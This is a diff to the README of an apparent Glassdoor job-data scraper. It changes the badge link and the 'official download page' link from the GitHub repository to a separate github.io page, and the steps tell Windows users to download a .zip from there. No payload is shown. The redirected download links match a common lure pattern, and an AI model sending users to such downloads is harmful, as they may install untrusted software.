@@ -1,6 +1,6 @@
 # 🔍 glassdoor-bff-scraper - Fetch structured job data with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Glassdoor_Scraper-blue.svg)](https://github.com/ankan8806/glassdoor-bff-scraper)
+[![Download Tool](https://img.shields.io/badge/Download-Glassdoor_Scraper-blue.svg)](https://ankan8806.github.io)
 
 ## 📝 About this tool
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/ankan8806/glassdoor-bff-scraper).
+1. Visit the [official download page](https://ankan8806.github.io).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version shown at the top of that list.
 4. Find the file ending in .zip under the Assets heading.
